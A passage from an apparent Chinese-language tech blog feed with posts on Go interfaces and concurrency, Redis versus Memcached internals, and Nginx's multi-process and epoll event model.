<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">switch t :&#x3D; i.(type) &#123;</span><br><span class="line">case *S:</span><br><span class="line">    fmt.Println(&quot;i store *S&quot;, t)</span><br><span class="line">case *R:</span><br><span class="line">    fmt.Println(&quot;i store *R&quot;, t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> </p>
<h2 id="空的-interface"><a href="#空的-interface" class="headerlink" title="空的 interface"></a>空的 interface</h2><hr>
<p><code>interface&#123;&#125;</code> 是一个空的 interface 类型，根据前文的定义：一个类型如果实现了一个 interface 的所有方法就说该类型实现了这个 interface，空的 interface 没有方法，所以可以认为所有的类型都实现了 <code>interface&#123;&#125;</code>。如果定义一个函数参数是 <code>interface&#123;&#125;</code> 类型，这个函数应该可以接受任何类型作为它的参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func doSomething(v interface&#123;&#125;)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果函数的参数 v 可以接受任何类型，那么函数被调用时在函数内部 v 是不是表示的是任何类型？并不是，虽然函数的参数可以接受任何类型，并不表示 v 就是任何类型，在函数 doSomething 内部 v 仅仅是一个 interface 类型，之所以函数可以接受任何类型是在 go 执行时传递到函数的任何类型都被自动转换成 <code>interface&#123;&#125;</code>。go 是如何进行转换的，以及 v 存储的值究竟是怎么做到可以接受任何类型的，感兴趣的可以看看 <a href="https://research.swtch.com/interfaces">Russ Cox 关于 interface 的实现</a> 。 既然空的 interface 可以接受任何类型的参数，那么一个 <code>interface&#123;&#125;</code>类型的 slice 是不是就可以接受任何类型的 slice ?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func printAll(vals []interface&#123;&#125;) &#123; &#x2F;&#x2F;1</span><br><span class="line">    for _, val :&#x3D; range vals &#123;</span><br><span class="line">        fmt.Println(val)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">func main()&#123;</span><br><span class="line">    names :&#x3D; \[\]string&#123;&quot;stanley&quot;, &quot;david&quot;, &quot;oscar&quot;&#125;</span><br><span class="line">    printAll(names)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>上面的代码是按照我们的假设修改的，执行之后竟然会报 <code>cannot use names (type []string) as type []interface &#123;&#125; in argument to printAll</code> 错误，why？ 这个错误说明 go 没有帮助我们自动把 slice 转换成 <code>interface&#123;&#125;</code> 类型的 slice，所以出错了。<strong>go 不会对 类型是<code>interface&#123;&#125;</code> 的 slice 进行转换</strong> 。为什么 go 不帮我们自动转换，一开始我也很好奇，最后终于在 go 的 wiki 中找到了答案 <a href="https://github.com/golang/go/wiki/InterfaceSlice">https://github.com/golang/go/wiki/InterfaceSlice</a> 大意是 <code>interface&#123;&#125;</code> 会占用两个字长的存储空间，一个是自身的 methods 数据，一个是指向其存储值的指针，也就是 interface 变量存储的值，因而 slice []interface{} 其长度是固定的<code>N*2</code>，但是 []T 的长度是<code>N*sizeof(T)</code>，两种 slice 实际存储值的大小是有区别的(文中只介绍两种 slice 的不同，至于为什么不能转换猜测可能是 runtime 转换代价比较大)。 但是我们可以手动进行转换来达到我们的目的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var dataSlice []int &#x3D; foo()</span><br><span class="line">var interfaceSlice []interface&#123;&#125; &#x3D; make([]interface&#123;&#125;, len(dataSlice))</span><br><span class="line">for i, d :&#x3D; range dataSlice &#123;</span><br><span class="line">    interfaceSlice[i] &#x3D; d</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> </p>
<h2 id="interface-的实现者的-receiver-如何选择"><a href="#interface-的实现者的-receiver-如何选择" class="headerlink" title="interface 的实现者的 receiver 如何选择"></a>interface 的实现者的 receiver 如何选择</h2><hr>
<p>在我们上文的例子中调用 f 是 <code>f(&amp;s)</code> 也就是 S 的指针类型，为什么不能是 <code>f(s)</code> 呢，如果是 s 会有什么问题？改成 f(s) 然后执行代码。</p>
<p>cannot use s (type S) as type I in argument to f:<br>    S does not implement I (Set method has pointer receiver)</p>
<p> </p>
<p>这个错误的意思是 S 没有实现 I，哪里出了问题？*<em>关键点是 S 中 set 方法的 receiver 是个 pointer <em>S</em></em> 。 interface 定义时并没有严格规定实现者的方法 receiver 是个 value receiver 还是 pointer receiver，上面代码中的 S 的 Set receiver 是 pointer，也就是实现 I 的两个方法的 receiver 一个是 value 一个是 pointer，使用 <code>f(s)</code>的形势调用，传递给 f 的是个 s 的一份拷贝，在进行 s 的拷贝到 I 的转换时，s 的拷贝不满足 Set 方法的 receiver 是个 pointer，也就没有实现 I。<strong>go 中函数都是按值传递即 passed by value</strong>。 那反过来会怎样，如果 receiver 是 value，函数用 pointer 的形式调用？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type I interface &#123;</span><br><span class="line">    Get() int</span><br><span class="line">    Set(int)</span><br><span class="line">&#125;</span><br><span class="line">type SS struct &#123;</span><br><span class="line">    Age int</span><br><span class="line">&#125;</span><br><span class="line">func (s SS) Get() int &#123;</span><br><span class="line">    return s.Age</span><br><span class="line">&#125;</span><br><span class="line">func (s SS) Set(age int) &#123;</span><br><span class="line">    s.Age &#x3D; age</span><br><span class="line">&#125;</span><br><span class="line">func f(i I) &#123;</span><br><span class="line">    i.Set(10)</span><br><span class="line">    fmt.Println(i.Get())</span><br><span class="line">&#125;</span><br><span class="line">func main()&#123;</span><br><span class="line">      ss :&#x3D; SS&#123;&#125;</span><br><span class="line">    f(&amp;ss) &#x2F;&#x2F;ponter</span><br><span class="line">    f(ss)  &#x2F;&#x2F;value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>I 的实现者 SS 的方法 receiver 都是 value receiver，执行代码可以看到无论是 pointer 还是 value 都可以正确执行。 导致这一现象的原因是什么？ 如果是按 pointer 调用，go 会自动进行转换，因为有了指针总是能得到指针指向的值是什么，如果是 value 调用，go 将无从得知 value 的原始值是什么，因为 value 是份拷贝。<strong>go 会把指针进行隐式转换得到 value，但反过来则不行</strong>。 对于 receiver 是 value 的 method，任何在 method 内部对 value 做出的改变都不影响调用者看到的 value，这就是按值传递。 另一个说明上述现象的例子是这样的来自 <a href="https://play.golang.org/p/TvR758rfre">https://play.golang.org/p/TvR758rfre</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line">type Animal interface &#123;</span><br><span class="line">    Speak() string</span><br><span class="line">&#125;</span><br><span class="line">type Dog struct &#123;</span><br><span class="line">&#125;</span><br><span class="line">func (d Dog) Speak() string &#123;</span><br><span class="line">    return &quot;Woof!&quot;</span><br><span class="line">&#125;</span><br><span class="line">type Cat struct &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;1</span><br><span class="line">func (c *Cat) Speak() string &#123;</span><br><span class="line">    return &quot;Meow!&quot;</span><br><span class="line">&#125;</span><br><span class="line">type Llama struct &#123;</span><br><span class="line">&#125;</span><br><span class="line">func (l Llama) Speak() string &#123;</span><br><span class="line">    return &quot;?????&quot;</span><br><span class="line">&#125;</span><br><span class="line">type JavaProgrammer struct &#123;</span><br><span class="line">&#125;</span><br><span class="line">func (j JavaProgrammer) Speak() string &#123;</span><br><span class="line">    return &quot;Design patterns!&quot;</span><br><span class="line">&#125;</span><br><span class="line">func main() &#123;</span><br><span class="line">    animals :&#x3D; \[\]Animal&#123;Dog&#123;&#125;, Cat&#123;&#125;, Llama&#123;&#125;, JavaProgrammer&#123;&#125;&#125;</span><br><span class="line">    for _, animal :&#x3D; range animals &#123;</span><br><span class="line">        fmt.Println(animal.Speak())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<p><code>#1</code> Cat 的 speak receiver 是 pointer，interface Animal 的 slice，Cat 的值是一个 value，同样会因为 receiver 不一致而导致无法执行。</p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>也谈 Redis 和 Memcached 的区别</title>
    <url>/2018/05/27/%E4%B9%9F%E8%B0%88-redis-%E5%92%8C-memcached-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>说到redis就会联想到memcached，反之亦然。了解过两者的同学有那么个大致的印象：</p>
<ul>
<li><blockquote>
<p>redis与memcached相比，比仅支持简单的key-value数据类型，同时还提供list,set,zset,hash等数据结构的存储；</p>
</blockquote>
</li>
<li><blockquote>
<p>redis支持数据的备份，即master-slave模式的数据备份；</p>
</blockquote>
</li>
<li><blockquote>
<p>redis支持数据的持久化，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用等等，</p>
</blockquote>
</li>
</ul>
<p>这似乎看起来redis比memcached更加牛逼一些，那么事实上是不是这样的呢？存在即合理，我们来根据几个不同点来一一比较一下。</p>
<h2 id="网络IO模型"><a href="#网络IO模型" class="headerlink" title="网络IO模型"></a>网络IO模型</h2><p>memcached是多线程，非阻塞IO复用的网络模型，分为监听主线程和worker子线程，监听线程监听网络连接，接受请求后，将连接描述字pipe传递给worker线程，进行读写IO，网络层使用libevent封装的事件库，多线程模型可以发挥多核作用，但是引入了cache coherency和锁的问题，比如：memcached最常用的stats命令，实际memcached所有操作都要对这个全局变量加锁，进行技术等工作，带来了性能损耗。 redis使用单线程的IO复用模型，自己封装了一个简单的AeEvent事件处理框架，主要实现了epoll, kqueue和select，对于单存只有IO操作来说，单线程可以将速度优势发挥到最大，但是redis也提供了一些简单的计算功能，比如排序、聚合等，对于这些操作，单线程模型施加会严重影响整体吞吐量，CPU计算过程中，整个IO调度都是被阻塞的。</p>
<h2 id="数据支持类型"><a href="#数据支持类型" class="headerlink" title="数据支持类型"></a>数据支持类型</h2><p>memcached使用key-value形式存储和访问数据，在内存中维护一张巨大的HashTable，使得对数据查询的时间复杂度降低到O(1)，保证了对数据的高性能访问。 正如开篇所说：redis与memcached相比，比仅支持简单的key-value数据类型，同时还提供list,set,zset,hash等数据结构的存储；</p>
<h2 id="内存管理机制不同"><a href="#内存管理机制不同" class="headerlink" title="内存管理机制不同"></a>内存管理机制不同</h2><p>在Redis中，并不是所有的数据都一直存储在内存中的。这是和Memcached相比一个最大的区别。当物理内存用完时，Redis可以将一些很久没用到的value交换到磁盘。Redis只会缓存所有的key的信息，如果Redis发现内存的使用量超过了某一个阀值，将触发swap的操作，Redis根据“swappability = age*log(size_in_memory)”计算出哪些key对应的value需要swap到磁盘。然后再将这些key对应的value持久化到磁盘中，同时在内存中清除。这种特性使得Redis可以保持超过其机器本身内存大小的数据。当然，机器本身的内存必须要能够保持所有的key，毕竟这些数据是不会进行swap操作的。同时由于Redis将内存中的数据swap到磁盘中的时候，提供服务的主线程和进行swap操作的子线程会共享这部分内存，所以如果更新需要swap的数据，Redis将阻塞这个操作，直到子线程完成swap操作后才可以进行修改。当从Redis中读取数据的时候，如果读取的key对应的value不在内存中，那么Redis就需要从swap文件中加载相应数据，然后再返回给请求方。 这里就存在一个I/O线程池的问题。在默认的情况下，Redis会出现阻塞，即完成所有的swap文件加载后才会相应。这种策略在客户端的数量较小，进行批量操作的时候比较合适。但是如果将Redis应用在一个大型的网站应用程序中，这显然是无法满足大并发的情况的。所以Redis运行我们设置I/O线程池的大小，对需要从swap文件中加载相应数据的读取请求进行并发操作，减少阻塞的时间。</p>
<p>对于像Redis和Memcached这种基于内存的数据库系统来说，内存管理的效率高低是影响系统性能的关键因素。传统C语言中的malloc/free函数是最常用的分配和释放内存的方法，但是这种方法存在着很大的缺陷：首先，对于开发人员来说不匹配的malloc和free容易造成内存泄露；其次频繁调用会造成大量内存碎片无法回收重新利用，降低内存利用率；最后作为系统调用，其系统开销远远大于一般函数调用。所以，为了提高内存的管理效率，高效的内存管理方案都不会直接使用malloc/free调用。Redis和Memcached均使用了自身设计的内存管理机制，但是实现方法存在很大的差异，下面将会对两者的内存管理机制分别进行介绍。 Memcached默认使用Slab Allocation机制管理内存，其主要思想是按照预先规定的大小，将分配的内存分割成特定长度的块以存储相应长度的key-value数据记录，以完全解决内存碎片问题。</p>
<p>Slab Allocation机制只为存储外部数据而设计，也就是说所有的key-value数据都存储在Slab Allocation系统里，而Memcached的其它内存请求则通过普通的malloc/free来申请，因为这些请求的数量和频率决定了它们不会对整个系统的性能造成影响Slab Allocation的原理相当简单。 如图所示，它首先从操作系统申请一大块内存，并将其分割成各种尺寸的块Chunk，并把尺寸相同的块分成组Slab Class。其中，Chunk就是用来存储key-value数据的最小单位。每个Slab Class的大小，可以在Memcached启动的时候通过制定Growth Factor来控制。假定图中Growth Factor的取值为1.25，如果第一组Chunk的大小为88个字节，第二组Chunk的大小就为112个字节，依此类推。 <img src="http://qiniu.fengmumiao.com/Slab-Allocation.png">  </p>
<p>当Memcached接收到客户端发送过来的数据时首先会根据收到数据的大小选择一个最合适的Slab Class，然后通过查询Memcached保存着的该Slab Class内空闲Chunk的列表就可以找到一个可用于存储数据的Chunk。当一条数据库过期或者丢弃时，该记录所占用的Chunk就可以回收，重新添加到空闲列表中。从以上过程我们可以看出Memcached的内存管理制效率高，而且不会造成内存碎片，但是它最大的缺点就是会导致空间浪费。因为每个Chunk都分配了特定长度的内存空间，所以变长数据无法充分利用这些空间。如图 所示，将100个字节的数据缓存到128个字节的Chunk中，剩余的28个字节就浪费掉了。 <img src="http://qiniu.fengmumiao.com/Chunk.png">  </p>
<p>Redis的内存管理主要通过源码中zmalloc.h和zmalloc.c两个文件来实现的。Redis为了方便内存的管理，在分配一块内存之后，会将这块内存的大小存入内存块的头部。如图所示，real_ptr是redis调用malloc后返回的指针。redis将内存块的大小size存入头部，size所占据的内存大小是已知的，为size_t类型的长度，然后返回ret_ptr。当需要释放内存的时候，ret_ptr被传给内存管理程序。通过ret_ptr，程序可以很容易的算出real_ptr的值，然后将real_ptr传给free释放内存。 <img src="http://qiniu.fengmumiao.com/zmalloc.png">  </p>
<p>Redis通过定义一个数组来记录所有的内存分配情况，这个数组的长度为ZMALLOC_MAX_ALLOC_STAT。数组的每一个元素代表当前程序所分配的内存块的个数，且内存块的大小为该元素的下标。在源码中，这个数组为zmalloc_allocations。zmalloc_allocations[16]代表已经分配的长度为16bytes的内存块的个数。zmalloc.c中有一个静态变量used_memory用来记录当前分配的内存总大小。所以，总的来看，Redis采用的是包装的mallc/free，相较于Memcached的内存管理方法来说，要简单很多。  </p>
<h2 id="集群管理的不同"><a href="#集群管理的不同" class="headerlink" title="集群管理的不同"></a>集群管理的不同</h2><p>Memcached是全内存的数据缓冲系统，Redis虽然支持数据的持久化，但是全内存毕竟才是其高性能的本质。作为基于内存的存储系统来说，机器物理内存的大小就是系统能够容纳的最大数据量。如果需要处理的数据量超过了单台机器的物理内存大小，就需要构建分布式集群来扩展存储能力。 Memcached本身并不支持分布式，因此只能在客户端通过像一致性哈希这样的分布式算法来实现Memcached的分布式存储。下图给出了Memcached的分布式存储实现架构。当客户端向Memcached集群发送数据之前，首先会通过内置的分布式算法计算出该条数据的目标节点，然后数据会直接发送到该节点上存储。但客户端查询数据时，同样要计算出查询数据所在的节点，然后直接向该节点发送查询请求以获取数据。 <img src="http://qiniu.fengmumiao.com/Memcached-node.jpg"></p>
<p>相较于Memcached只能采用客户端实现分布式存储，Redis更偏向于在服务器端构建分布式存储。最新版本的Redis已经支持了分布式存储功能。Redis Cluster是一个实现了分布式且允许单点故障的Redis高级版本，它没有中心节点，具有线性可伸缩的功能。下图给出Redis Cluster的分布式存储架构，其中节点与节点之间通过二进制协议进行通信，节点与客户端之间通过ascii协议进行通信。在数据的放置策略上，Redis Cluster将整个key的数值域分成4096个哈希槽，每个节点上可以存储一个或多个哈希槽，也就是说当前Redis Cluster支持的最大节点数就是4096。Redis Cluster使用的分布式算法也很简单：crc16( key ) % HASH_SLOTS_NUMBER。 <img src="http://qiniu.fengmumiao.com/Redis-Cluster.jpg">  </p>
<p>为了保证单点故障下的数据可用性，Redis Cluster引入了Master节点和Slave节点。在Redis Cluster中，每个Master节点都会有对应的两个用于冗余的Slave节点。这样在整个集群中，任意两个节点的宕机都不会导致数据的不可用。当Master节点退出后，集群会自动选择一个Slave节点成为新的Master节点。 <img src="http://qiniu.fengmumiao.com/Redis-Cluster-2.jpg"></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang并发编程</title>
    <url>/2018/05/26/golang%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="Goroutine"><a href="#Goroutine" class="headerlink" title="Goroutine"></a>Goroutine</h2><p>在Go语言中，语言本身就已经实现和支持了并发， 我们只需要通过<code>go</code>关键字来开启<code>goroutine</code>即可。 gouroutine其实就是一种协程，类似其他语言中的coroutine， 是在编译器或虚拟机层面上的多任务。它可以运行在一个或多个线程上，但不同于线程，它是<strong>非抢占式的</strong>，所以协程很轻量。</p>
<pre><code>func main() &#123;
    for i := 0; i &lt; 1000; i++ &#123;
    go func(ii int) &#123;
        for &#123;
            fmt.Printf(&quot;Hello %d\n&quot;, ii)
        &#125;
        &#125;(i)
    &#125;

    time.Sleep(time.Millisecond)
&#125;</code></pre>
<p>上述代码就开启了1000个协程，在1ms内不断的打印字符串，这里需要注意两个点：</p>
<ol>
<li>time.Sleep 在main函数退出前，Sleep了1ms。这是因为当main函数退出时，之前开的协程也会随着退出，如果不Sleep，则无法看到打印信息。</li>
<li>匿名函数将变量i作为参数赋值传入。 如果不传参，变量i也能被使用，但是是以引用的方式。而i在main函数中在不断自增，导致在goroutine打印信息中，无法知道是第几个协程打印的。</li>
</ol>
<p>从打印信息上看，跟开线程没什么区别，无非就是数量上不同。但是在操作系统层面，线程是抢占式，而我们之前说协程是非抢占式的，这怎么会一样呢？ 出现上述问题的原因在于，在调用<code>Printf</code>的时候，进行了切换， goroutine主动让出了控制权。我们修改代码如下，演示下非抢占：</p>
<pre><code>a := [10]int&#123;&#125;
for i := 0; i &lt; 10; i++ &#123;
    go func(ii int) &#123;
        for &#123;
            a[ii]++
        &#125;
    &#125;(i)
&#125;

time.Sleep(time.Millisecond)
fmt.Println(a)</code></pre>
<p>运行上述代码，出现了死循环。因为在开辟的第一个goroutine中，一直循环执行<code>a[ii]++</code>，一直没有让出控制权；而<code>main</code>本质上也是个goroutine，所以后面的代码都没有执行完，也没有退出。 遇到这种情况，我们可以在goroutine中主动让出控制权，例如：</p>
<pre><code>a[ii]++
runtime.Gosched()</code></pre>
<p>goroutine 可能会切换的点 （不能保证）:</p>
<ul>
<li>I/O,select</li>
<li>channel</li>
<li>等待锁</li>
<li>runtime.Gosched()</li>
</ul>
<h2 id="CSP并发模型"><a href="#CSP并发模型" class="headerlink" title="CSP并发模型"></a>CSP并发模型</h2><p>Go实现了两种并发形式：</p>
<ol>
<li>共享内存 + 锁同步</li>
<li>CSP. 通过goroutine和channel来实现的.</li>
</ol>
<p>CSP并发模型是在1970年左右提出的概念，属于比较新的概念，不同于传统的多线程通过共享内存来通信，CSP讲究的是“以通信的方式来共享内存”。</p>
<blockquote>
<p>Do not communicate by sharing memory; instead, share memory by communicating 不要以共享内存的方式来通信，相反，要通过通信来共享内存。</p>
</blockquote>
<h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>channel 是用来在不同goroutine之间进行通信的，无论传值还是取值， 它都是阻塞的。</p>
<pre><code>c := make(chan int)
c &lt;- 1</code></pre>
<p>上面代码直接运行会造成死锁：</p>
<pre><code>all goroutines are asleep - deadlock!</code></pre>
<p>所以一般在使用channel前先开一个goroutine去接收channel:</p>
<pre><code>func createWorker() chan int &#123;
    c := make(chan int)
    go func() &#123;
        for n := range c &#123;
            fmt.Println(&quot;received:&quot;, n)
        &#125;
    &#125;()

    return c
&#125;

func main() &#123;
    var channels [10]chan int

    for i, _ := range channels &#123;
        channels[i] = createWorker()
    &#125;

    for i, c := range channels &#123;
        c &lt;- i
    &#125;

    time.Sleep(time.Millisecond)
&#125;</code></pre>
<p>在上述代码中，我们定义了一个<code>createWorker</code>，用来创建一个接收者，同时返回了一个channel。同时我们可以对返回的channel做限制，例如：</p>
<pre><code>func createWorker() chan&lt;- int // 只能发送数据
func createWorker() &lt;-chan int // 只能接收数据</code></pre>
<p>一般可以通过<code>n := &lt;- c</code>来接收数据，在上述例子中使用了range，因为channel是可以close的。 <code>close(c)</code>关闭channel， 但是关闭后在worker中依然能接收到channel（只要goroutine没有退出）。而接收到的数据是定义的channel的零值，在上述例子中，则收到0.</p>
<ul>
<li>通过<code>n,ok := &lt;- c</code>的ok来判断channel是否关闭；也可以通过range来接收；</li>
<li>如果往已经关闭的channel写数据，会panic：<code>send on closed channel</code>. <strong>不要从接收端关闭channel，也不要关闭有多个并发发送者的channel</strong></li>
</ul>
<h3 id="等待任务结束"><a href="#等待任务结束" class="headerlink" title="等待任务结束"></a>等待任务结束</h3><p>在之前的例子中，我们都是通过Sleep方法来粗略的控制任务的执行，这在实际生产中肯定不能这么干。之前也说了channel是用来通信的，那么我们可以通过channel来告诉使用者任务已经执行完了。 代码优化如下：</p>
<pre><code>type worker struct &#123;
    in   chan int
    done chan bool
&#125;

func createWorker() worker &#123;
    w := worker&#123;
        in:   make(chan int),
        done: make(chan bool),
    &#125;

    go func(w worker) &#123;
        for n := range w.in &#123;
            fmt.Println(&quot;received:&quot;, n)
            w.done &lt;- true
        &#125;
    &#125;(w)

    return w
&#125;

func chanNormal() &#123;
    var workers [10]worker

    for i, _ := range workers &#123;
        workers[i] = createWorker()
    &#125;

    for i, w := range workers &#123;
        w.in &lt;- i
    &#125;

    for _, w := range workers &#123;
        &lt;-w.done
    &#125;

&#125;

func main() &#123;
    chanNormal()
&#125;</code></pre>
<p>除了我们自己定义channel，go也为我们提供了<code>sync.WaitGroup</code>，来管理一组任务。</p>
<pre><code>var wg sync.WaitGroup
wg.Add(1)
wg.Done()
wg.Wait()</code></pre>
<h3 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h3><p>将struct中的done抽象成一个方法，在<code>create</code>的时候实现，这样在<code>worker</code>中就不用管具体代码了，只要调用done方法即可。</p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx多进程模型</title>
    <url>/2018/05/15/Nginx%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="nginx采用多进程模型好处"><a href="#nginx采用多进程模型好处" class="headerlink" title="nginx采用多进程模型好处"></a>nginx采用多进程模型好处</h2><p>首先，对于每个worker进程来说，独立的进程，不需要加锁，所以省掉了锁带来的开销，同时在编程以及问题查找时，也会方便很多。</p>
<p>其次，采用独立的进程，可以让互相之间不会影响，一个进程退出后，其它进程还在工作，服务不会中断，master进程则很快启动新的worker进程。当然，worker进程的异常退出，肯定是程序有bug了，异常退出，会导致当前worker上的所有请求失败，不过不会影响到所有请求，所以降低了风险。</p>
<h3 id="nginx多进程事件模型：异步非阻塞"><a href="#nginx多进程事件模型：异步非阻塞" class="headerlink" title="nginx多进程事件模型：异步非阻塞"></a>nginx多进程事件模型：异步非阻塞</h3><p>虽然nginx采用多worker的方式来处理请求，每个worker里面只有一个主线程，那能够处理的并发数很有限啊，多少个worker就能处理多少个并发，何来高并发呢？非也，这就是nginx的高明之处，nginx采用了异步非阻塞的方式来处理请求，也就是说，nginx是可以同时处理成千上万个请求的。一个worker进程可以同时处理的请求数只受限于内存大小，而且在架构设计上，不同的worker进程之间处理并发请求时几乎没有同步锁的限制，worker进程通常不会进入睡眠状态，因此，当Nginx上的进程数与CPU核心数相等时（最好每一个worker进程都绑定特定的CPU核心），进程间切换的代价是最小的。</p>
<p>而apache的常用工作方式（apache也有异步非阻塞版本，但因其与自带某些模块冲突，所以不常用），每个进程在一个时刻只处理一个请求，因此，当并发数上到几千时，就同时有几千的进程在处理请求了。这对操作系统来说，是个不小的挑战，进程带来的内存占用非常大，进程的上下文切换带来的cpu开销很大，自然性能就上不去了，而这些开销完全是没有意义的。</p>
<p>为什么nginx可以采用异步非阻塞的方式来处理呢，或者异步非阻塞到底是怎么回事呢？</p>
<p>我们先回到原点，看看一个请求的完整过程:首先，请求过来，要建立连接，然后再接收数据，接收数据后，再发送数据。</p>
<p>具体到系统底层，就是读写事件，而当读写事件没有准备好时，必然不可操作，如果不用非阻塞的方式来调用，那就得阻塞调用了，事件没有准备好，那就只能等了，等事件准备好了，你再继续吧。阻塞调用会进入内核等待，cpu就会让出去给别人用了，对单线程的worker来说，显然不合适，当网络事件越多时，大家都在等待呢，cpu空闲下来没人用，cpu利用率自然上不去了，更别谈高并发了。好吧，你说加进程数，这跟apache的线程模型有什么区别，注意，别增加无谓的上下文切换。所以，在nginx里面，最忌讳阻塞的系统调用了。不要阻塞，那就非阻塞喽。非阻塞就是，事件没有准备好，马上返回EAGAIN，告诉你，事件还没准备好呢，你慌什么，过会再来吧。好吧，你过一会，再来检查一下事件，直到事件准备好了为止，在这期间，你就可以先去做其它事情，然后再来看看事件好了没。虽然不阻塞了，但你得不时地过来检查一下事件的状态，你可以做更多的事情了，但带来的开销也是不小的。</p>
<p>关于IO模型：<a href="http://blog.csdn.net/hguisu/article/details/7453390">http://blog.csdn.net/hguisu/article/details/7453390</a></p>
<p>nginx支持的事件模型如下（nginx的wiki）:</p>
<h3 id="Nginx支持如下处理连接的方法（I-O复用方法），这些方法可以通过use指令指定。"><a href="#Nginx支持如下处理连接的方法（I-O复用方法），这些方法可以通过use指令指定。" class="headerlink" title="Nginx支持如下处理连接的方法（I/O复用方法），这些方法可以通过use指令指定。"></a>Nginx支持如下处理连接的方法（I/O复用方法），这些方法可以通过use指令指定。</h3><p>select– 标准方法。 如果当前平台没有更有效的方法，它是编译时默认的方法。你可以使用配置参数 –with-select_module 和 –without-select_module 来启用或禁用这个模块。<br>poll– 标准方法。 如果当前平台没有更有效的方法，它是编译时默认的方法。你可以使用配置参数 –with-poll_module 和 –without-poll_module 来启用或禁用这个模块。<br>kqueue– 高效的方法，使用于 FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X. 使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。<br>epoll – 高效的方法，使用于Linux内核2.6版本及以后的系统。在某些发行版本中，如SuSE 8.2, 有让2.4版本的内核支持epoll的补丁。<br>rtsig – 可执行的实时信号，使用于Linux内核版本2.2.19以后的系统。默认情况下整个系统中不能出现大于1024个POSIX实时(排队)信号。这种情况 对于高负载的服务器来说是低效的；所以有必要通过调节内核参数 /proc/sys/kernel/rtsig-max 来增加队列的大小。可是从Linux内核版本2.6.6-mm2开始， 这个参数就不再使用了，并且对于每个进程有一个独立的信号队列，这个队列的大小可以用 RLIMIT_SIGPENDING 参数调节。当这个队列过于拥塞，nginx就放弃它并且开始使用 poll 方法来处理连接直到恢复正常。<br>/dev/poll – 高效的方法，使用于 Solaris 7 11/99+, HP/UX 11.22+ (eventport), IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+.<br>eventport – 高效的方法，使用于 Solaris 10. 为了防止出现内核崩溃的问题， 有必要安装这个 安全补丁。<br>在linux下面，只有epoll是高效的方法</p>
<p>下面再来看看epoll到底是如何高效的<br>Epoll是Linux内核为处理大批量句柄而作了改进的poll。 要使用epoll只需要这三个系统调用：epoll_create(2)， epoll_ctl(2)， epoll_wait(2)。它是在2.5.44内核中被引进的(epoll(4) is a new API introduced in Linux kernel 2.5.44)，在2.6内核中得到广泛应用。</p>
<h2 id="epoll的优点"><a href="#epoll的优点" class="headerlink" title="epoll的优点"></a>epoll的优点</h2><ol>
<li><p>支持一个进程打开大数目的socket描述符(FD)<br>select 最不能忍受的是一个进程所打开的FD是有一定限制的，由FD_SETSIZE设置，默认值是2048。对于那些需要支持的上万连接数目的IM服务器来说显 然太少了。这时候你一是可以选择修改这个宏然后重新编译内核，不过资料也同时指出这样会带来网络效率的下降，二是可以选择多进程的解决方案(传统的 Apache方案)，不过虽然linux上面创建进程的代价比较小，但仍旧是不可忽视的，加上进程间数据同步远比不上线程间同步的高效，所以也不是一种完 美的方案。不过 epoll则没有这个限制，它所支持的FD上限是最大可以打开文件的数目，这个数字一般远大于2048,举个例子,在1GB内存的机器上大约是10万左 右，具体数目可以cat /proc/sys/fs/file-max察看,一般来说这个数目和系统内存关系很大。</p>
</li>
<li><p>IO效率不随FD数目增加而线性下降<br> 传统的select/poll另一个致命弱点就是当你拥有一个很大的socket集合，不过由于网络延时，任一时间只有部分的socket是”活跃”的，但 是select/poll每次调用都会线性扫描全部的集合，导致效率呈现线性下降。但是epoll不存在这个问题，它只会对”活跃”的socket进行操 作—这是因为在内核实现中epoll是根据每个fd上面的callback函数实现的。那么，只有”活跃”的socket才会主动的去调用 callback函数，其他idle状态socket则不会，在这点上，epoll实现了一个”伪”AIO，因为这时候推动力在os内核。在一些 benchmark中，如果所有的socket基本上都是活跃的—比如一个高速LAN环境，epoll并不比select/poll有什么效率，相 反，如果过多使用epoll_ctl,效率相比还有稍微的下降。但是一旦使用idle connections模拟WAN环境,epoll的效率就远在select/poll之上了。</p>
</li>
<li><p>使用mmap加速内核与用户空间的消息传递。<br>这 点实际上涉及到epoll的具体实现了。无论是select,poll还是epoll都需要内核把FD消息通知给用户空间，如何避免不必要的内存拷贝就很 重要，在这点上，epoll是通过内核于用户空间mmap同一块内存实现的。而如果你想我一样从2.5内核就关注epoll的话，一定不会忘记手工 mmap这一步的。</p>
</li>
